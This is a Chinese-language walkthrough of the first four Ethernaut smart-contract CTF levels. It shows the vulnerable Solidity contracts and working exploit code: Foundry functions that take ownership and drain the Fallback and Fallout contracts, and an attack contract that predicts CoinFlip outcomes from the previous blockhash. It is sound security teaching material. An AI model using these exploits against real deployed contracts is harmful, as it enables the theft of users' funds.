

## **挑战#0：Hello Ethernaut**

```js
await contract.info()
"You will find what you need in info1()."

await contract.info1()
"Try info2(), but with "hello" as a parameter."

await contract.info2("hello")
"The property infoNum holds the number of the next info method to call."

await contract.infoNum()
42

await contract.info42()
"theMethodName is the name of the next method."

await contract.theMethodName()
"The method name is method7123949."

await contract.method7123949()
"If you know the password, submit it to authenticate()."

await contract.password()
"ethernaut0"

await contract.authenticate("ethernaut0")
```

该关卡其实是一系列的函数调用与传参操作，其实该关卡就是让玩家熟悉控制台和MetaMask的使用以及配合交互操作！



## **挑战#1：Fallback**

**闯关要求**

- 成为合约的owner
- 将余额减少为0

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

首先我们注意到，所使用的Solidity编译器版本是`< 0.8.x`。这意味着该合约很容易出现数学下溢和上溢的错误。

这个合约导入和使用OpenZeppelin [SafeMath](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath)库，但没有在代码里使用它。不过这里我们仍然没有办法利用溢出来掏空合约，至少在这个特定的情况下是这样。

耗尽合约的唯一方法是通过`withdraw`函数，只有当`msg.sender`等于变量`owner`的值时才能调用（见`onlyOwner`函数修改器）。这个函数将把合约中的所有资金转移到 "所有者"地址。

```js
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
```

如果我们找到一种方法，将`所有者`的值改为我们的地址，我们将能够从合约中抽走所有的以太币。

实际上，在合约中，有两个地方的`owner`变量是用`msg.sender`更新的

1. `contribute`函数
2. `**receive`函数**

```js
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

`receive`**函数**

这是一个 "特殊" 的函数，当有人向合约发送一些以太坊而没有在交易的 "数据"字段中指定任何东西时，receive 就会被 "自动"调用。

引用官方[Solidity文档](https://learnblockchain.cn/docs/solidity/contracts.html#receive)中对receive函数的介绍：

> *一个合约现在只能有一个* `receive` *函数，声明的语法是：* `receive() external payable {...} `（没有 `function` *关键词）。它在没有数据（**calldata**）的合约调用时执行，例如通过* `send()` *或* `transfer()`*调用。该函数不能有参数，不能返回任何东西，并且必须有* `external` *可见性和* `payable `状态可变性。

下面是`receive`函数的代码：

```js
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

在`receive`函数中，只有当与交易一起发送的`wei`数额`>0`并且我们在`contributions[msg.sender]`中的贡献`>0`时，`owner`就会更新`msg.sender`。

**以下是我们需要做的事情：**

1. 用最大的`0.001 ether`（通过`require`检查）向合约捐款，调用`contribute`函数，这样`contributions[msg.sender]`将大于0 ；
2. 直接向合约发送`1 wei`，触发`receive`函数，成为新的`owner`
3. 调用`withdraw`，将合约中储存的`ETH`全部掏空!

```js
function exploitLevel() internal override {
    vm.startPrank(player);
    
    // send the minimum amount to become a contributor
    level.contribute{value: 0.0001 ether}();
    
    // send directly to the contract 1 wei, this will allow us to become the new owner
    // 地址转账 level只是一个地址  contract是实例 相当于 contract.sendTransaction({value: 1}) 
    // 发送交易 这个交易中值包含了 value数据 没有包含 to gas data等等
    (bool sent, ) = address(level).call{value: 1}("");
    require(sent, "Failed to send Ether to the level");
    
    // now that we are the owner of the contract withdraw all the funds
    level.withdraw();
    vm.stopPrank();
}
```

**receive** **接收以太函数**

不需要 `function` 关键字，也没有参数和返回值并且必须是　`external`　可见性和　`payable` 修饰． 它可以是 `virtual` 的，可以被重载也可以有 修改器modifier 。

在对合约没有任何附加数据调用（通常是对合约转账）是会执行 `receive` 函数．　例如　通过 `.send()` or `.transfer()` 如果 `receive` 函数不存在，　但是有payable　的 [fallback 回退函数](https://learnblockchain.cn/docs/solidity/contracts.html#fallback-function) 那么在进行纯以太转账时，fallback 函数会调用．

如果两个函数都没有，这个合约就没法通过常规的转账交易接收以太（会抛出异常）．

更糟的是，`receive` 函数可能只有 2300 gas 可以使用（如，当使用 `send` 或 `transfer` 时）， 除了基础的日志输出之外，进行其他操作的余地很小。下面的操作消耗会操作 2300 gas :

- 写入存储
- 创建合约
- 调用消耗大量 gas 的外部函数
- 发送以太币

>一个没有receive函数的合约，可以作为 *coinbase 交易* （又名 *矿工区块回报* ）的接收者或者作为 `selfdestruct` 的目标来接收以太币。
>
>一个合约不能对这种以太币转移做出反应，因此也不能拒绝它们。这是 EVM 在设计时就决定好的，而且 Solidity 无法绕过这个问题。
>
>这也意味着 `address(this).balance` 可以高于合约中实现的一些手工记帐的总和（例如在receive　函数中更新的累加器记帐）。

**Fallback** **回退函数**

如果在一个对合约调用中，没有其他函数与给定的函数标识符匹配fallback会被调用． 或者在没有 [receive 函数](https://learnblockchain.cn/docs/solidity/contracts.html#receive-ether-function)　时，而没有提供附加数据对合约调用，那么fallback 函数会被执行。

fallback　函数始终会接收数据，但为了同时接收以太时，必须标记为　`payable` 。

如果使用了带参数的版本， `input` 将包含发送到合约的完整数据（等于 `msg.data` ），并且通过 `output` 返回数据。 返回数据不是 ABI 编码过的数据，相反，它返回不经过修改的数据。

更糟的是，如果回退函数在接收以太时调用，可能只有 2300 gas 可以使用，参考　[receive接收函数](https://learnblockchain.cn/docs/solidity/contracts.html#receive-ether-function)

与任何其他函数一样，只要有足够的 gas 传递给它，回退函数就可以执行复杂的操作。

>`payable` 的fallback函数也可以在纯以太转账的时候执行， 如果没有　[receive 以太函数](https://learnblockchain.cn/docs/solidity/contracts.html#receive-ether-function) 推荐总是定义一个receive函数，而不是定义一个``payable`` 的fallback函数.



**总结**： 也就是说 不带data时，默认去调用receive() 函数，receive()函数不存在，才会去调用fallback()函数。

如果带有data,  且函数名匹配不到其他函数，则会直接调用fallback() 并且把参数作为fallback() 的input。

两个函数很可能只有少量的gas可以使用，因此操作应该尽可能简单。

```js

// 这个合约会保留所有发送给它的以太币，没有办法返还。
contract TestPayable {
    uint x;
    uint y;

    // 除了纯转账外，所有的调用都会调用这个函数．
    // (因为除了 receive 函数外，没有其他的函数).
    // 任何对合约非空calldata 调用会执行回退函数(即使是调用函数附加以太).
    fallback() external payable { x = 1; y = msg.value; }

    // 纯转账调用这个函数，例如对每个空empty calldata的调用
    receive() external payable { x = 2; y = msg.value; }
}

// 因为函数有存储写入, 会比简单的使用 ``send`` or ``transfer``消耗更多的 gas。
// 因此使用底层的call调用
(success,) = address(test).call{value: 2 ether}("");
require(success);
```

## **挑战#2：Fallout**

[本挑战](https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5)的目标是要求获得`Fallout`合约的所有权。

`Fallout`合约代码如下：

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

这个挑战非常独特，如果你是Solidity安全主题的新手，你可能很难理解如何解决这个挑战，但只有一个原因：这个问题只在`Solidity 0.4.22`之前存在。

在`Solidity 0.4.22`之前，为一个合约定义构造函数的唯一方法是定义一个与合约本身同名的函数。

**这个挑战的解决方案非常简单**。我们只需要调用从未被调用过的`Fal1out`函数。

```js
function exploitLevel() internal override {
    vm.startPrank(player);
    
    // 在 Solidity 0.4.22 之前，为一个合约定义构造函数的唯一方法是定义一个与合约本身同名的函数。
    //  在该版本之后，他们引入了一个新的`constructor`关键字来避免这种错误。
    // 在这个例子中，开发者犯了一个错误，把构造函数的名字弄错了。
    // Contract name -> Fallout
    // Constructor name -> Fal1out
    // 这样做的结果是，合约从未被初始化，所有者是地址(0)
    // 而且我们能够调用`Fal1out`函数，在这一点上，它不是一个构造函数（只能调用一次），而是一个 "普通"函数。
    // 这也意味着任何人都可以多次调用这个函数来切换合约的所有者。
    level.Fal1out();
    
    vm.stopPrank();
}
```



## **挑战#3 — 投掷硬币**

这是一个掷硬币游戏，你需要通过猜测掷硬币的结果来建立你的连胜记录。要完成这个等级，你需要使用你的通灵能力来连续10次猜测正确的结果。

```js
pragma solidity ^0.4.18;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

```js
block.blockhash(block.number.sub(1))
```

**分析**

在合约的开头先定义了三个uint256类型的数据——consecutiveWins、lastHash、FACTOR，其中FACTOR被赋予了一个很大的数值，之后查看了一下发现是2^255。之后定义的CoinFlip为构造函数，在构造函数中将我们的猜对次数初始化为0。lasthash代表的就是上一个区块的hash值。

之后就是产生coinflip，它就是拿来判断硬币翻转的结果的，它是拿blockValue/FACTR，前面也提到FACTOR实际是等于2^255，若换成256的二进制就是最左位是0，右边全是1，而我们的blockValue则是256位的，因为solidity里“/”运算会取整，所以coinflip的值其实就取决于blockValue最高位的值是1还是0，换句话说就是跟它的最高位相等。



通过对以上代码的分析我们可以看到硬币翻转的结果其实完全取决于前一个块的hash值，看起来这似乎是随机的，它也确实是随机的，然而事实上它也是可预测的，因为一个区块当然并不只有一个交易，所以我们完全可以先运行一次这个算法，看当前块下得到的coinflip是1还是0然后选择对应的guess，这样就相当于提前看了结果。因为块之间的间隔也只有10s左右，要手工在命令行下完成合约分析中操作还是有点困难，所以我们需要在链上另外部署一个合约来完成这个操作，在部署时可以直接使用[http://remix.ethereum.org来部署](http://remix.ethereum.xn--org-r99fq57hj5v/)

**攻击合约**

```js
pragma solidity ^0.4.18;
contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract exploit {
  CoinFlip expFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function exploit(address aimAddr) {
    expFlip = CoinFlip(aimAddr);
  }

  function hack() public {
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool guess = coinFlip == 1 ? true : false;
    expFlip.flip(guess);
  }
}
```























